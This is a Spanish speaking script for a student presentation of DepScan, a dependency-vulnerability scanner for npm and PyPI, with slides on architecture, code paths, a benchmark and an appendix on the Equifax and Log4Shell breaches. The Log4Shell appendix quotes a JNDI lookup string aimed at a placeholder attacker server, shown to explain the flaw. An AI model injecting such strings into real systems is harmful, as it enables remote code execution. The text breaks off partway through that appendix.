# Speech · Presentación DepScan

Guion para `DepScan-Presentacion.html` (28 diapositivas). Duración estimada: **27–30 minutos** más preguntas.
El texto está pensado para decirse en voz alta, no para leerse: úsalo como guía y di las ideas con tus palabras.

> Consejo general: en cada diapositiva di primero **la idea** (el título) y luego los detalles. Si te pierdes, vuelve al título.

**Reparto sugerido entre los tres autores** (ajústenlo como prefieran):

| Bloque | Diapositivas | Quién |
|---|---|---|
| Problema y solución | 1–6 | Angel Gadiel Hernández Cruz |
| Cómo funciona (casos de uso, arquitectura, diagramas UML, motor y código) | 7–17 | Richard Alexis Podestá Condori |
| Producto, resultados y cierre | 18–28 | Gustavo Alonso Sagua Ramos |

> La calidad del código (pruebas, cobertura, SonarCloud, Snyk, Semgrep) y la seguridad de la aplicación van en una **presentación aparte**. Si preguntan aquí, respondan en una frase y remitan a esa presentación.

---

## Diapositiva 1 · Portada — *DepScan* (≈ 30 s)

> Buenos días/tardes. Somos Angel Gadiel Hernández Cruz, Richard Alexis Podestá Condori y Gustavo Alonso Sagua Ramos, de la Escuela Profesional de Ingeniería de Sistemas de la Universidad Privada de Tacna.
>
> Les presentamos **DepScan**, un sistema web que detecta las dependencias vulnerables de proyectos **npm** y **PyPI**, es decir, de proyectos en JavaScript y en Python, y que además le dice al desarrollador **cómo corregirlas**.
>
> Los tres círculos del logo son un semáforo: rojo, ámbar y verde. Es justamente la forma en la que la aplicación comunica el nivel de riesgo de un proyecto.

---

## Diapositiva 2 · El problema — *El código que no escribimos también nos puede atacar* (≈ 1 min 15 s)

> Hoy casi nadie programa desde cero. Cuando creamos un proyecto instalamos librerías, y esas librerías instalan otras librerías. A estas últimas las llamamos **dependencias transitivas**: son dependencias de nuestras dependencias, y nunca las elegimos directamente.
>
> Miren los números de la derecha. Escaneamos **OWASP NodeGoat**, un proyecto Node.js de referencia. Tiene **1091 dependencias**, y el **97 %**, 1055, son transitivas: no aparecen en el `package.json`. Es decir, si el desarrollador revisa a mano su archivo de dependencias, solo ve el 3 % de lo que realmente tiene instalado.
>
> De esas 1091, **133 paquetes son vulnerables** y hay **20 fallas críticas**.
>
> El problema tiene dos partes. Primero: cuando se publica una falla en una librería, el equipo no se entera, porque nadie cruza *lo que tengo instalado* con *lo que ya se sabe que está roto*. Y segundo: aun sabiendo que hay una falla, decidir **a qué versión actualizar** sin romper el proyecto y sin caer en otra versión vulnerable es prueba y error.
>
> Estos datos no son de un artículo: son de un escaneo nuestro, en producción, sobre un commit fijo, hecho el 14 de octubre.

---

## Diapositiva 3 · Antecedentes — *No es un riesgo teórico* (≈ 2 min)

> ¿Esto ha pasado de verdad? Sí, y con consecuencias enormes.
>
> **Equifax, 2017.** Equifax es una de las tres grandes empresas de historial crediticio de Estados Unidos. Usaba **Apache Struts**, un framework web de Java, con una falla conocida: la `CVE-2017-5638`. El parche estaba disponible desde el **6 de marzo**; los atacantes entraron en **mayo**, unos dos meses después. Resultado: se expusieron los datos personales de unos **147 millones de personas**. No fue un ataque sofisticado: la solución existía y **nadie actualizó el componente**.
>
> **Log4Shell, 2021.** Log4j es una librería de Java que sirve solo para escribir registros, *logs*. La `CVE-2021-44228`, con severidad máxima, **10 de 10**, permitía **ejecutar código en el servidor** con solo hacer que la aplicación registrara un texto del atacante. Miles de organizaciones **no sabían que usaban Log4j**, porque venía como dependencia transitiva. Es exactamente el 97 % de la diapositiva anterior.
>
> **OWASP Top 10.** OWASP incluye "**Componentes vulnerables y desactualizados**" entre los diez riesgos principales de aplicaciones web, en la categoría **A06 de 2021**.
>
> Y abajo, lo que ya existe: las vulnerabilidades ya están publicadas gratis en **OSV**, de Google, y **NVD**, del NIST, y hay herramientas como `npm audit`, `pip-audit`, OSV-Scanner y Snyk. Por eso nuestra tesis es que **el valor no está en los datos, sino en procesarlos bien y explicarlos**.

*(La explicación a fondo de estos casos está al final de este documento, en "Antecedentes explicados".)*

---

## Diapositiva 4 · Nuestra solución — *DepScan: de la lista de librerías a la solución* (≈ 1 min)

> Y ahí entra DepScan. La idea en una frase: **le das tu proyecto —archivos, una carpeta o un repositorio de GitHub— y en segundos te dice qué librerías tienen fallas conocidas, cuáles atender primero y exactamente qué versión instalar.**
>
> Lo hace en tres pasos, con los colores del semáforo:
> 1. **Detectar:** lee los manifiestos, resuelve la versión exacta de cada dependencia, incluidas las transitivas, y la cruza con OSV y NVD.
> 2. **Priorizar:** une los avisos repetidos —una misma falla puede tener nombre CVE, GHSA o PYSEC—, ordena por severidad y resume el proyecto en un semáforo.
> 3. **Corregir:** recomienda una versión **verificada contra todos los avisos**, con los comandos listos y mitigaciones si no se puede actualizar.
>
> Y todo con una web en español, npm y PyPI juntos, reportes HTML y PDF, historial, una CLI para integración continua, y gratis.

---

## Diapositiva 5 · Objetivo — *Detectar, priorizar y decir cómo corregir* (≈ 1 min)

> El objetivo general es desarrollar un sistema web que **detecte** las dependencias vulnerables de proyectos npm y PyPI a partir de sus **versiones exactas**, las **priorice** por severidad y entregue los **pasos concretos para remediarlas**.
>
> Lo dividimos en seis objetivos específicos, que retomaremos uno por uno en las conclusiones:
> - **OE1:** leer `package.json`, `package-lock.json` y `requirements.txt` y obtener la versión exacta de cada dependencia.
> - **OE2:** consultar OSV en lote y enriquecer con el CVSS oficial de NVD.
> - **OE3:** lógica propia: eliminar duplicados, priorizar y mostrar un semáforo.
> - **OE4:** recomendar una versión segura **verificada contra todos los avisos**.
> - **OE5:** web, reportes HTML y PDF, historial, inicio de sesión y CLI para CI.
> - **OE6:** **medir** los resultados contra herramientas existentes con un benchmark reproducible.

---

## Diapositiva 6 · Alcance — *Qué hace y qué no hace* (≈ 1 min)

> Es importante ser claros con los límites.
>
> **Dentro del alcance:** npm y PyPI con sus dependencias transitivas; subir archivos, una carpeta, o escanear un repositorio de GitHub en un commit exacto, incluso privado si conectas tu cuenta; versión recomendada, comandos, `overrides`, mitigaciones y parches; historial, comparación antes y después, reportes, y la CLI que puede **detener una entrega** si hay fallas graves.
>
> **Limitaciones declaradas:** DepScan **no descubre fallas nuevas**, solo las ya publicadas. **No sabe si el código usa la función afectada** —a eso se le llama alcanzabilidad—. Sin lockfile la precisión baja, y en ese caso avisamos o estimamos, y lo marcamos. No aplica las correcciones de forma automática. Y necesita internet, aunque usamos una caché de 24 horas.

---

## Diapositiva 7 · Casos de uso — *Quién usa DepScan y para qué* (≈ 1 min 15 s)

> Este es el diagrama de casos de uso, tomado de nuestra especificación de requerimientos, el FD03. Tenemos **cuatro actores**:
> - El **Visitante**, que puede usar DepScan sin cuenta: subir archivos (CU-01), revisar un repositorio de GitHub (CU-02), iniciar sesión y consultar su historial.
> - El **Usuario registrado**, que **hereda** todo lo del visitante —por eso la flecha con triángulo— y además puede revisar sus propios repositorios, incluidos los privados, y cerrar sesión.
> - El **Docente**, que descarga el informe para evaluar un proyecto.
> - Y la **Revisión automática**, que no es una persona: es el pipeline de integración continua que ejecuta DepScan en cada cambio.
>
> El caso central es **CU-03, Consultar resultado**. Subir archivos y revisar un repositorio lo **incluyen** siempre, y Ver la solución y Descargar el informe lo **extienden**: son opciones que el usuario elige desde el resultado.
>
> En total son 10 casos de uso que cubren 20 requerimientos funcionales.

---

## Diapositiva 8 · Caso de uso destacado — *Revisar un repositorio de GitHub, paso a paso* (≈ 1 min 30 s)

> Elegimos el CU-02 porque recorre todo el sistema. Es un diagrama de secuencia: cada columna es un participante y las flechas son los mensajes, de arriba hacia abajo.
> 1. El usuario pega el repositorio, por ejemplo `OWASP/NodeGoat`.
> 2. La web lo envía a la API.
> 3. La API le pregunta a GitHub cuál es el **commit exacto** de esa rama, y
> 4. descarga **solo los manifiestos** de ese commit, no todo el código: como máximo 100 archivos.
> 5. Le pasa los archivos al **motor**, que
> 6. los parsea y resuelve la versión exacta de cada dependencia.
> 7. Consulta a **OSV en lote**: hasta 1000 paquetes en una sola petición.
> 8. OSV devuelve los avisos de cada versión.
> 9. El motor deduplica, prioriza y calcula la versión segura.
> 10 a 12. El reporte vuelve a la API, se guarda en el historial y el usuario ve el semáforo con la solución.
>
> El detalle clave está abajo: al analizar un **commit exacto**, el resultado es **reproducible**. Si mañana el repositorio cambia, este reporte sigue correspondiendo a ese commit.

---

## Diapositiva 9 · Arquitectura — *Mapa del sistema: cómo encaja cada pieza* (≈ 1 min 30 s)

> Este es el mapa completo, tomado de nuestro documento de arquitectura, el FD04.
>
> **Arriba, los clientes:** el desarrollador desde el navegador y el pipeline de integración continua.
>
> **En el centro, el recuadro punteado** es lo que corre en producción: **un solo contenedor Docker en Railway**. Dentro están la **web en React**, la **API en Fastify** y la base de datos **SQLite** en un volumen persistente.
>
> **El hexágono es el corazón: el motor `@depscan/core`.** Ahí está toda la lógica propia: parsers, resolución de versiones, comparadores semver y PEP 440, deduplicación y remediación. Lo dibujamos como hexágono porque seguimos la **arquitectura hexagonal**, o de puertos y adaptadores: el motor **no conoce** HTTP, ni la base de datos, ni React.
>
> **A la derecha, los servicios externos:** OSV, NVD, los registros de npm y PyPI, y GitHub. Debajo de cada uno, en azul, está el **adaptador** que habla con él y el **puerto** —la interfaz— que cumple. Por ejemplo, `OsvClient` cumple el puerto `VulnSource`. Si mañana quisiéramos usar otra base de vulnerabilidades, se escribe otro adaptador y el motor no cambia.
>
> Fíjense en la flecha de la CI: la CLI usa **el mismo motor como librería**. Web, API y CLI comparten exactamente la misma lógica.

---

## Diapositiva 10 · Diagrama de paquetes — *Cómo está organizado el código* (≈ 1 min)

> Este es el **diagrama de paquetes** del FD04: cómo está organizado el código en el repositorio.
>
> **Arriba están las cuatro aplicaciones**, que son las puertas de entrada:
> - `apps/web`, la interfaz en React;
> - `apps/api`, el servidor Fastify con la base de datos;
> - `apps/cli`, la línea de comandos;
> - `apps/vscode`, la extensión del editor.
>
> **Abajo, el recuadro azul grande es `packages/core`**, el motor. Las flechas punteadas son dependencias del tipo *«import»*: la API, la CLI y la extensión **importan el motor como librería**. La web no lo importa: le habla a la API por HTTP y JSON.
>
> **Dentro del motor, `scan.ts` es el orquestador**: usa `project` para leer carpetas, `resolver` para las versiones, `analysis` para el análisis y los **puertos** de `sources`. Los **adaptadores** de OSV, NVD, registros y GitHub *implementan* esos puertos: es el triángulo hueco de abajo a la derecha.
>
> Lo importante: **ninguna flecha sale del motor hacia las aplicaciones**. El motor no sabe que existe una web ni una base de datos.

---

## Diapositiva 11 · Diagrama de clases del dominio — *El reporte y lo que contiene* (≈ 1 min)

> Este es el **diagrama de clases del dominio**. Son los tipos reales de `packages/core/src/domain/types.ts`.
>
> **La raíz es `ScanReport`, el reporte de un escaneo.** El rombo lleno significa *composición*: el reporte **contiene** sus partes:
> - un `ScanTarget`, que dice qué se analizó (carpeta, archivos subidos o un repo de GitHub con su commit);
> - un `ScanSummary` con los conteos y el semáforo;
> - todas las `Dependency` analizadas;
> - los `Finding`, que son los hallazgos.
>
> Cada **`Finding`** apunta a **una** dependencia y agrupa **una o más `Vulnerability`**, ya deduplicadas: por eso el `id` prefiere CVE y guarda los demás nombres en `aliases`. Además tiene **cero o una `Remediation`**, la solución, con el estado (*upgrade*, *no-fix* o *unknown*), la versión recomendada, si está **verificada**, y sus opciones de actualización y mitigaciones.
>
> A la derecha están las enumeraciones: `Severity`, `Risk` (rojo, ámbar, verde), `Ecosystem` y `Resolution`, que indica de dónde salió la versión exacta.

---

## Diapositiva 12 · Diagrama de clases de interfaces — *Puertos y adaptadores* (≈ 1 min)

> Esta es la parte de diseño que más defendemos: **el motor no conoce a OSV**.
>
> **Arriba, `scan.ts`** recibe un objeto `ScanSources` con tres **interfaces**, que son los *puertos*:
> - `VulnSource`, para consultar vulnerabilidades;
> - `CveEnricher`, para el CVSS de NVD;
> - `RegistrySource`, para listar versiones publicadas.
>
> **Abajo están las clases que los implementan**, la flecha punteada con triángulo: `OsvClient`, `NvdClient` y `RegistryClient`.
>
> **A la derecha, el puerto `Cache`** tiene cuatro implementaciones según dónde corre el motor:
> - `MemoryCache` en la CLI;
> - `Database` con SQLite en la API;
> - `CacheArchivo` en la extensión de VS Code;
> - `Telemetry`, que la *envuelve* para contar aciertos y fallos (patrón decorador).
>
> **¿Para qué sirve esto?** En las pruebas reemplazamos OSV por una fuente simulada sin tocar una línea del motor. Y si mañana usamos otra base de vulnerabilidades, se escribe otro adaptador.

---

## Diapositiva 13 · Modelo de datos — *Qué se guarda y dónde* (≈ 45 s)

> La base de datos es **SQLite**, en el archivo `apps/api/src/db.ts`. Tiene cinco tablas:
> - **`users`** e **`identities`**: un usuario puede unir varias cuentas (Google y GitHub). El token de GitHub se guarda **cifrado con AES-256-GCM**.
> - **`sessions`**: guardamos el **hash SHA-256** del token, nunca el token. `user_id` vacío significa sesión anónima.
> - **`scans`**: el historial. El campo `owner` dice de quién es: `user:` más el id, o `anon:` más la sesión. `private` marca los repos privados.
> - **`cache`**: no tiene relaciones. Guarda las respuestas de OSV, NVD y los registros con su fecha de vencimiento.
>
> Cada seis horas, `purgeExpired()` borra sesiones y caché vencidas.

---

## Diapositiva 14 · Dentro del motor — *Un escaneo en 7 pasos* (≈ 1 min)

> Si abrimos el hexágono, un escaneo sigue siete pasos:
> 1. **Leer** los manifiestos, con rangos de versión, archivos incluidos con `-r`, extras y comentarios.
> 2. **Resolver** la versión exacta desde el lockfile. Esto es fundamental: el `package.json` dice "cualquier 4.x", pero lo vulnerable o no es una versión concreta.
> 3. **Consultar** OSV con `querybatch`, hasta 1000 paquetes por petición.
> 4. **Detallar** severidad, alias y versiones corregidas, con caché, y unir los duplicados.
> 5. **Enriquecer**, opcionalmente, con el CVSS oficial de NVD.
> 6. **Analizar**: priorizar, separar directas de transitivas y calcular la versión segura.
> 7. **Reportar**: semáforo, web, HTML, PDF y código de salida para CI.
>
> Debajo de cada paso, en azul, está **el archivo donde ocurre**; la siguiente diapositiva lo detalla. Y la división clave: **OSV y NVD aportan los datos; DepScan aporta todo lo demás**, y los siete pasos los orquesta una sola función, `scanProject()`, en `packages/core/src/scan.ts`.

---

## Diapositiva 15 · Trazabilidad — *¿En qué archivo ocurre cada paso?* (≈ 2 min 30 s)

> En la presentación anterior el ingeniero nos preguntó **en qué parte del código ocurre cada uno de los siete pasos**. Esta diapositiva es la respuesta, con archivo, función y línea. Lo contamos siguiendo un escaneo de principio a fin.
>
> **Paso 0, la entrada.** Hay tres puertas:
> - En la **web**, `lib/manifests.ts` con `readManifests()` filtra en el navegador solo los manifiestos. Luego `lib/api.ts` los envía a la API.
> - En la **API**, la ruta `POST /api/scans` está en `apps/api/src/app.ts`, línea 203. Limpia las rutas (descarta `..` y lo que no sea manifiesto) y, si es un repo, llama a `fetchGithubProject()`.
> - En la **CLI**, `apps/cli/src/index.ts` usa `readProjectDirectory()` de `core/project/files.ts`.
>
> Las tres terminan llamando a `scanProject()` en `packages/core/src/scan.ts`. **Desde aquí, todo es el motor.**
>
> **Paso 1, leer.** `scanProject` llama a `resolveProject()`, y este llama a los parsers:
> - `parsePackageJson()` en `parsers/npm/package-json.ts`;
> - `parseLockfile()` en `parsers/npm/lockfile.ts`, que entiende las versiones 1, 2 y 3 del lockfile;
> - `parseRequirements()` en `parsers/pypi/requirements.ts`.
>
> **Paso 2, resolver.** En `resolver/resolve.ts`:
> - `resolveProject()`, en la línea 195, decide por carpeta;
> - `resolveNpm()` cruza `package.json` con el lockfile y marca qué dependencias son directas y cuáles transitivas;
> - `resolvePypi()` hace lo mismo para Python;
> - si falta la versión y el usuario lo pidió, `estimate()` consulta el registro.
>
> Para comparar versiones usa nuestros comparadores propios, en `versions/semver.ts` y `versions/pep440.ts`.
>
> **Paso 3, consultar.** De vuelta en `scan.ts`, líneas 66 a 76, se arma **una sola consulta por nombre y versión**, aunque el paquete se repita. Luego se llama a `queryBatch()` en `sources/osv/osv-client.ts`, que hace `POST /v1/querybatch` en lotes de mil. Los reintentos ante errores están en `sources/http.ts`.
>
> **Paso 4, detallar.** En `scan.ts`, líneas 80 a 98, se pide el detalle de cada aviso con `getVulnerability()`, ocho en paralelo y **con caché**. Después, en `analysis/analyze.ts`:
> - `normalizeVulnerability()` calcula la severidad, con el CVSS de `cvss.ts`;
> - `dedupe()` **une el mismo fallo publicado como CVE, GHSA o PYSEC**.
>
> **Paso 5, enriquecer.** Es opcional. Está en `scan.ts`, líneas 100 a 124: `getCve()` de `nvd-client.ts` trae el CVSS oficial y `applyNvd()` lo aplica.
>
> **Paso 6, analizar.** En `analyze.ts`, `buildFinding()` arma cada hallazgo y su semáforo con `riskOf()`, y `sortFindings()` los ordena por prioridad. Después, `buildRemediation()` en `analysis/remediation.ts` calcula la **versión segura verificada**: cruza **todos** los avisos del paquete con todas las versiones publicadas usando `isAffected()` de `affected.ts`.
>
> **Paso 7, reportar.** `scan.ts`, líneas 150 a 168, agrega las advertencias y llama a `summarize()` para el semáforo final. Con ese `ScanReport`:
> - la **API** lo guarda con `db.saveScan()` (`app.ts`, línea 266) y responde 201;
> - la **web** lo muestra en `ScanResult.tsx`;
> - los **reportes** salen de `renderHtml()` y `renderPdf()`;
> - la **CLI** decide el código de salida con `shouldFail()`.

---

## Diapositiva 16 · Diagrama de actividades — *El flujo exacto del código* (≈ 1 min 30 s)

> Este **diagrama de actividades** sigue `scanProject()` **línea por línea**, con sus decisiones. Los círculos azules son los números de los siete pasos.
>
> **Columna izquierda:**
> - Empieza leyendo y resolviendo. **Primera decisión:** si quedan dependencias sin versión y el usuario activó *estimar*, se consulta el registro.
> - Se arman las consultas únicas. **Segunda decisión:** si no hay ninguna, no se llama a OSV y la lista de avisos queda vacía; la flecha de la derecha salta esa caja.
> - Luego se consulta OSV en lote, se pide el detalle de cada aviso y se normaliza y deduplica.
>
> **Columna derecha:**
> - **Tercera decisión:** solo si se pidió NVD y la fuente existe, se enriquece con CVSS.
> - Se arman y ordenan los hallazgos.
> - **Cuarta decisión:** si hay hallazgos y no se desactivó la remediación, se calcula la versión segura, seis paquetes en paralelo, pidiendo a la vez todos los avisos del paquete y sus versiones publicadas.
> - Al final, advertencias, resumen y semáforo. La API lo guarda y responde; la CLI imprime y define su código de salida.
>
> Lo que muestra el diagrama es lo que hace el código, decisión por decisión.

---

## Diapositiva 17 · Mapa de archivos — *De la pantalla a OSV* (≈ 1 min 30 s)

> Aquí están **todos los archivos de código** que hacen funcionar DepScan, agrupados por carpeta:
> - la web, con 23 archivos;
> - la API, la CLI y la extensión;
> - el motor, con 24 archivos;
> - a la derecha, los servicios externos y la base de datos;
> - en la última columna, los archivos de la raíz que hacen funcionar el monorepo, el build y el despliegue: `package.json` con los workspaces, `Dockerfile`, `railway.json` y los workflows.
>
> **Las líneas azules son el recorrido de un escaneo**, con los números de los siete pasos:
> 1. Empieza en `NewScan.tsx`: el usuario sube archivos.
> 2. `manifests.ts` los filtra y `api.ts` los envía.
> 3. Entran a `app.ts` en la API, que llama a `scan.ts`.
> 4. Del motor salen hacia `resolve.ts` y los tres parsers (pasos 1 y 2), hacia `osv-client.ts` y OSV (pasos 3 y 4), hacia NVD (paso 5) y hacia `analyze.ts` y `remediation.ts` (paso 6).
> 5. El resultado vuelve a `app.ts`, se guarda con `db.ts` en SQLite (paso 7) y se muestra en `ScanResult.tsx`.
>
> **Las líneas grises** son otros flujos:
> - el login, que va de `providers.ts` a Google y GitHub;
> - la CLI y la extensión de VS Code, que entran directo al motor;
> - el PDF, que usa los tipos del dominio.
>
> Si quieren seguir cualquier paso en el código, este mapa dice exactamente a qué archivo ir.

---

## Diapositiva 18 · Nuestra diferencia — *Remediación verificada* (≈ 1 min 30 s)

> Esta es la parte que más nos diferencia, y la explicamos con un caso real: Log4j.
>
> Cada fila es un aviso de seguridad y cada columna una versión. Rojo es afectada; verde, no afectada. El proyecto está en la **2.14.1**.
>
> El enfoque habitual dice: "el aviso `CVE-2021-44228` se corrigió en la **2.15.0**, actualiza a esa". Pero miren la columna de la 2.15.0: sigue en rojo para **otros tres avisos**. Eso pasó de verdad: en diciembre de 2021 hubo que pasar a la 2.16, luego a la 2.17 y luego a la 2.17.1.
>
> DepScan no mira un solo aviso: evalúa **cada versión candidata contra todos los avisos del paquete**, y solo recomienda la que queda en verde en todas las filas: la **2.17.1**. Además, entrega los comandos para aplicarla y mitigaciones si no se puede actualizar.
>
> Aclaración: Log4j es Java y lo usamos solo como ejemplo, porque es el más conocido. DepScan aplica exactamente la misma regla en npm y PyPI.

---

## Diapositiva 19 · Tecnología — *Un solo lenguaje de punta a punta: TypeScript* (≈ 45 s)

> Todo el sistema está en **TypeScript**. Frontend con React 19, Vite y Tailwind. Backend con Node.js 24 y Fastify 5. El motor es una librería propia, `@depscan/core`, **sin dependencias de runtime**, algo coherente para un escáner de dependencias. Base de datos SQLite nativa de Node. PDFs con pdfkit. CLI con `parseArgs` de Node. Y despliegue con Docker en Railway.

---

## Diapositiva 20 · Decisiones — *¿Por qué esta tecnología y no otra?* (≈ 1 min 15 s)

> Cada elección tiene una razón, documentada como ADR, registros de decisiones de arquitectura:
> - **TypeScript en todo:** mismos tipos entre web, API y motor, y la restricción del curso era trabajar solo con VS Code.
> - **Arquitectura hexagonal** en lugar de capas tradicionales: el motor no depende de la web ni de la base de datos, por eso se reutiliza en web, API y CLI.
> - **Fastify:** más moderno que Express, con validación por esquemas, y mucho más ligero que NestJS.
> - **SQLite:** sin servidor que instalar ni pagar; suficiente para historial y caché.
> - **OSV como fuente principal:** NVD tiene mala cobertura de npm y limita a 5 consultas cada 30 segundos; OSV acepta lotes de 1000.
> - **Comparadores propios** en vez de la librería `semver`: es la parte evaluable del proyecto y además cubre **PEP 440**, el formato de versiones de Python.
> - **Un solo servicio** en Railway: un dominio, sin CORS, menor costo.
> - **pdfkit** en lugar de un Chrome dentro del contenedor: imagen más liviana.

---

## Diapositiva 21 · La aplicación — *Escanear es arrastrar una carpeta o pegar un repo* (≈ 45 s)

> Esta es la pantalla de nuevo escaneo. Hay tres formas: **subir archivos o una carpeta** —el navegador filtra solo los manifiestos, ignorando `node_modules`—; pegar un **repositorio de GitHub**, que se analiza en un commit exacto; o elegir de **mis repos de GitHub**, incluidos los privados.
>
> Hay opciones para incluir dependencias de desarrollo, estimar sin lockfile y usar el CVSS de NVD. Se puede entrar con Google o GitHub, y si escaneaste sin cuenta, el escaneo pasa a tu cuenta al iniciar sesión.

---

## Diapositiva 22 · La aplicación — *El resultado: semáforo, severidades y cada hallazgo* (≈ 45 s)

> Este es el resultado de NodeGoat. Arriba, el **semáforo** de riesgo y el conteo por severidad. Se registra la rama, el **commit**, la versión del escáner y el tiempo: **7,2 segundos para 1091 dependencias**.
>
> La tabla se filtra por severidad, directa o transitiva, ecosistema y desarrollo. Cada paquete muestra sus CVE **ya deduplicados** y la versión recomendada. Y se descarga en HTML o PDF.

---

## Diapositiva 23 · La aplicación — *No solo dice qué está mal: dice cómo arreglarlo* (≈ 45 s)

> Y esto es lo que vimos en la diapositiva de Log4j, ya en la aplicación. Al abrir un hallazgo:
> - La **versión recomendada**, preferiblemente dentro de la misma versión mayor para no romper nada; si hace falta un salto mayor, se avisa.
> - **Todas las versiones seguras**, verificadas contra todos los avisos del paquete.
> - **Comandos listos para copiar**: `npm install`, `overrides` para dependencias transitivas y `pip install`.
> - Y si no se puede actualizar, **mitigaciones** según el tipo de falla, su CWE, con enlaces a los parches.

---

## Diapositiva 24 · Validación — *Benchmark: ¿encuentra lo mismo que npm audit?* (≈ 1 min 30 s)

> Para no quedarnos en "creemos que funciona", lo **medimos**. Eso es el benchmark: una **prueba comparativa**. Pasamos DepScan y `npm audit` —la herramienta oficial que viene con npm— sobre los **mismos proyectos**, que son proyectos hechos vulnerables a propósito para enseñar seguridad, **congelados en un commit**, y cruzamos los resultados aviso por aviso. Cualquiera puede repetirlo con `npm run benchmark`.
>
> En NodeGoat, `npm audit` reporta 197 avisos y DepScan 193; los 193 están en común. En nodejs-goof, 232 frente a 228, todos en común. En vulnerable-node, 5 y 5.
>
> La conclusión: **cero fallas** que encuentre `npm audit` y DepScan no. ¿Y por qué `npm audit` muestra 4 más? Porque hay avisos GHSA distintos que comparten el mismo CVE: es **la misma falla contada dos veces**. DepScan los une.
>
> En PyPI `npm audit` no aplica; DepScan encontró 147 avisos en pygoat y 55 en dvpwa.
>
> Una aclaración: hablamos de **avisos**, no de paquetes; un paquete puede tener varios. Por eso en NodeGoat son 133 paquetes vulnerables pero 193 avisos. Y las bases cambian a diario: estos números son de la corrida del 13 de octubre.

---

## Diapositiva 25 · Comparación — *Frente a herramientas similares* (≈ 1 min)

> `npm audit` y `pip-audit` cubren un ecosistema cada una, son de consola y en inglés. OSV-Scanner cubre ambos y deduplica, pero no tiene interfaz web y su remediación es parcial. Snyk es la más completa, pero es comercial, y el PDF y varias funciones son de pago.
>
> DepScan reúne todo: npm y PyPI juntos, interfaz web, en **español**, deduplicación, versión recomendada verificada, todas las versiones seguras, mitigaciones, PDF, y es **gratis**.

---

## Diapositiva 26 · Trabajo futuro — *Hacia dónde puede crecer* (≈ 45 s)

> Hacia adelante: **más ecosistemas** como Maven, Go, Cargo, Composer y NuGet; gracias a la arquitectura solo hacen falta nuevos parsers y comparadores. **Alcanzabilidad**, para saber si el código realmente llama a la función vulnerable. **Correcciones automáticas** vía pull request, con revisión humana. **Benchmark ampliado** con OSV-Scanner y `pip-audit` para PyPI. **Alertas** cuando se publique una falla nueva en un proyecto ya escaneado. Y exportar el inventario como **SBOM** en CycloneDX o SPDX.

---

## Diapositiva 27 · Conclusiones — *Cada objetivo, con su evidencia* (≈ 1 min 15 s)

> Volvemos a los seis objetivos del inicio, cada uno con su evidencia:
> - **OE1:** leemos los lockfiles de npm en sus tres versiones y los `requirements` de Python; resolvimos las 1091 dependencias de NodeGoat.
> - **OE2:** consultamos OSV en lotes de hasta 1000 y, si se pide, el CVSS oficial de NVD.
> - **OE3:** unimos avisos CVE, GHSA y PYSEC, priorizamos y mostramos el semáforo.
> - **OE4:** cada versión candidata se verifica contra todos los avisos del paquete.
> - **OE5:** el sistema está en producción, con reportes, historial y CLI.
> - **OE6:** en el benchmark, cero fallas perdidas frente a `npm audit`.
>
> Y cerramos con la idea central: DepScan informa fallas **conocidas**, no la explotabilidad real; su aporte es convertir esos datos en **una decisión clara**: qué actualizar, a qué versión y cómo.
>
> Si Equifax hubiera tenido algo que cruzara automáticamente lo instalado con lo publicado y bloqueara la entrega, esa falla de dos meses no habría pasado desapercibida. Eso es lo que automatiza DepScan.

---

## Diapositiva 28 · Gracias — *¿Preguntas?* (≈ 15 s)

> Muchas gracias por su atención. La demo está en línea en esta dirección y el código en GitHub. Quedamos atentos a sus preguntas.

---
---

# Antecedentes explicados (para entender y defender la diapositiva 3)

Los antecedentes sirven para demostrar que el problema **es real, es caro y sigue ocurriendo**. Cada caso justifica una función concreta de DepScan. Si te preguntan "¿y eso qué tiene que ver con tu proyecto?", la respuesta está en la línea **Relación con DepScan** de cada caso.

## 1. Equifax (2017) — el caso principal

**Qué es Equifax.** Una de las tres grandes agencias de historial crediticio de Estados Unidos: guarda nombres, números de seguro social, fechas de nacimiento, direcciones y, en algunos casos, números de licencia de conducir y tarjetas de crédito.

**Qué componente falló.** Apache Struts 2, un framework de Java para aplicaciones web. Equifax lo usaba en su portal de disputas de crédito (donde los ciudadanos reclaman errores en su historial).

**La falla: CVE-2017-5638.** Estaba en el componente que procesa la subida de archivos (el parser *Jakarta Multipart*). Un atacante podía enviar una petición HTTP con un encabezado `Content-Type` manipulado que contenía una expresión OGNL (el lenguaje de expresiones de Struts) y el servidor **la ejecutaba**. Es decir: ejecución remota de código sin necesidad de usuario ni contraseña.

**Línea de tiempo (lo que más impacta):**

| Fecha (2017) | Hecho |
|---|---|
| 6–7 de marzo | Se publica la vulnerabilidad y el parche de Apache Struts. |
| Pocos días después | Ya se ven ataques automatizados contra servidores en internet; según el informe del GAO, a Equifax empezaron a escanearla a los pocos días. |
| Marzo | Equifax recibe la alerta interna, pero la lista de responsables a notificar estaba desactualizada y el escaneo interno no encontró el sistema vulnerable. **No se parcha.** |
| 13 de mayo | Los atacantes entran por el portal de disputas. |
| Mayo – julio | Permanecen dentro unos **76 días** extrayendo datos. No se detectó antes en parte porque un certificado del sistema de monitoreo de tráfico llevaba meses vencido. |
| 29–30 de julio | Equifax detecta el tráfico sospechoso. |
| 7 de septiembre | Se anuncia públicamente la filtración. |

**Consecuencias.** Datos de unos **147 millones de personas**. Renunciaron el CEO, el CIO y el CSO, y en 2019 Equifax llegó a un acuerdo con la FTC y los estados de hasta unos 700 millones de dólares.

**La moraleja.** No fue una falla desconocida ni un ataque avanzado: **el parche existía dos meses antes**. El problema fue de inventario y de proceso: nadie cruzó *lo que tengo instalado* con *lo que se sabe que está roto*.

**Relación con DepScan.** Es exactamente lo que automatiza: inventario de dependencias con versión exacta + cruce con bases públicas + la CLI en CI con `--fail-on` que **impide desplegar** una versión con fallas críticas, sin depender de que una persona lea un correo.

> Nota: Struts es Java (Maven), un ecosistema que DepScan aún no cubre (está en trabajo futuro). Si te lo señalan, responde que el caso ilustra el **tipo de problema**, que es idéntico en npm y PyPI, y que agregar Maven solo requiere un parser y un comparador nuevos gracias a la arquitectura.

## 2. Log4Shell (2021) — el problema de las transitivas

**Qué es Log4j.** Una librería de Java para escribir *logs* (registros como "usuario X inició sesión"). Está presente en una cantidad enorme de software: servidores, productos empresariales, servicios en la nube, incluso Minecraft, donde se vieron los primeros ataques.

**La falla: CVE-2021-44228, CVSS 10.0 (el máximo).** Log4j interpretaba ciertos textos especiales dentro de lo que registraba. Si un atacante lograba que la aplicación registrara algo como `${jndi:ldap://servidor-del-atacante/x}` —por ejemplo, poniéndolo en el nombre de usuario o en el encabezado *User-Agent*—, Log4j se conectaba a ese servidor, descargaba código y **lo ejecutaba**. Bastaba con que el texto apareciera en un log.

